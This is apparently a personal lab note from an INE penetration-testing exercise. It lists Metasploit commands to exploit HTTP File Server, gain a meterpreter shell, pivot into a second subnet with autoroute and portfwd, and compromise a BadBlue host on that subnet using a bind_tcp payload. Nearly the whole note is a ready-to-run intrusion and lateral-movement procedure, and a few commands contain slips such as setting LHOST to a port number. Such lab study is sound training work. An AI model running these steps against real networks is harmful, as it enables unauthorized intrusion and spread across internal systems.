```
service postgresql start && msfconsole

db_nmap -sV demo.ine.local
search httpfileserver
use 0
set RHOST demo.ine.local
run
```
```meterpreter
ipconfig
sysinfo
getuid
run autoroute -s 10.2.27.0/20
background

sessions -n victim-1
```
1. `run autoroute -s victime1_interface/CIDR` : only applicable to MSF
2. 
Now running portscan on 2nd N/W
```MSF
search portscan
use auxiliary/scanner/portscan/tcp
set RHOST 10.2.27.187
set PORTS 1-100
run
```

To perform NMAP scan we need to forward port 80 on victim to a local port or our local host
```
session victim-1
portfwd add -l 1234 -p 80 -r 10.2.27.187
background
```
`portfwd add -l LOCALPORT -p REMOTEPORT -r VICTIM_2-IP`

```MSF
db_nmap -sS -sV -p 1234 localhost

search badblue
use 1
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 10.2.27.187
set LHOST 4433
run
```

-> In order to get a reverse shell of the machine on a pivoted network
- we have to use `bind_tcp` payload, as a reverse connection will not possible.
- Set other LPORT as 4444 is utiliszed by session 1
```MSF
sysinfo
getuid

background
sessions -n victim-2
```

#tip 
2. you can use `chisel` | `SSH` too. 
---
1. `run autoroute -s victime1_interface/CIDR` 
2. `Payload`:auxiliary/scanner/portscan/tcp
3. `portfwd add -l LOCALPORT -p REMOTEPORT -r VICTIM_2-IP`
4. `Payload`:Windows/meterpreter/bind_tcp